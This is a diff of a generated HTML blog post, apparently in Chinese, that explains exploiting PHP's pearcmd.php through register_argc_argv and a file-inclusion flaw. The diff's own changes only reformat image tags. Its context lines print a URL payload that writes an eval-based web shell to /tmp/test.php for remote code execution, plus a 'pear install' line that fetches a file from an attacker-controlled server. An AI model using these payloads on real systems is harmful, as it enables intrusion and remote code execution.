@@ -30,8 +30,6 @@
 <meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/07/28/8fbcac33456cc860.png">
 <meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/07/28/def0c651719cd2db.png">
 <meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/07/28/44555fc9f3043dbf.png">
-<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/07/28/fbd8e7bc4f0bc9c6.png">
-<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/07/28/a57d4a9d1ba01220.png">
 <meta property="article:published_time" content="2023-07-28T07:30:47.000Z">
 <meta property="article:modified_time" content="2023-07-28T07:37:42.435Z">
 <meta property="article:author" content="竹云">
@@ -218,21 +216,23 @@
 <p>安装了pear扩展 php开启了<code>register_argc_argv</code>选项</p>
 <p>docker中默认都开启</p>
 <h1 id="register_argc_argv">register_argc_argv</h1>
-<p><img src="https://s3.bmp.ovh/imgs/2023/07/28/8fbcac33456cc860.png">
+<p><img src="https://s3.bmp.ovh/imgs/2023/07/28/8fbcac33456cc860.png" />
 在命令行模式下获取传入的参数，在web服务的情况下获取url中<code>?</code>后面的内容，<em><strong>无论是否有<code>=</code>号</strong>
-<img src="https://s3.bmp.ovh/imgs/2023/07/28/def0c651719cd2db.png">
-<img src="https://s3.bmp.ovh/imgs/2023/07/28/44555fc9f3043dbf.png">
+<img src="https://s3.bmp.ovh/imgs/2023/07/28/def0c651719cd2db.png" />
+<img src="https://s3.bmp.ovh/imgs/2023/07/28/44555fc9f3043dbf.png" />
 在web中传参有几点需要注意的： </em>
 <code>=</code>和<code>&amp;</code>会被当成字符串解析 *
 每个参数之间需要使用<code>+</code>分割，不能使用空格 *
-它的解析不影响正常的GET传参 <img src="https://s3.bmp.ovh/imgs/2023/07/28/fbd8e7bc4f0bc9c6.png"></p>
+它的解析不影响正常的GET传参 <img
+src="https://s3.bmp.ovh/imgs/2023/07/28/fbd8e7bc4f0bc9c6.png" /></p>
 <h1 id="pearcmd.php">pearcmd.php</h1>
 <p>一般在docker中的默认安装目录为<code>/usr/local/lib/php</code>,也有可能因为版本不同在<code>/usr/share/php/pearcmd.php</code></p>
 <p>pear/pcel是一个命令行工具。如果我们能够包含其中的文件，并控制输入的参数，就可以通过它执行命令。</p>
 <h2 id="config-create">config-create</h2>
-<p>创建配置文件，可以在不出网的情况下挂马。<br>
+<p>创建配置文件，可以在不出网的情况下挂马。<br />
 第一个参数为写入的内容，但必须以<code>/</code>开头，第二个参数为写入文件的路径。
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure> 发送时需要抓包发送，不然会被url编码 <img src="https://s3.bmp.ovh/imgs/2023/07/28/a57d4a9d1ba01220.png">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure> 发送时需要抓包发送，不然会被url编码 <img
+src="https://s3.bmp.ovh/imgs/2023/07/28/a57d4a9d1ba01220.png" />
 然后包含<code>/tmp/test.php</code>就可以RCE了</p>
 <h2 id="install">install</h2>
 <p>需要靶机出网 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure>
